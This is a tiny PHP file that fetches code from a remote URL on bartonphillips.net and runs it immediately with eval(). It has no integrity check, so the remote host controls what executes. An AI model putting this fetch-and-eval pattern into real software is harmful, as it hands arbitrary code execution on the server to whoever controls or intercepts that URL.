<?php
$page = file_get_contents("https://bartonphillips.net/geoAjax.eval");
return eval("?>". $page);
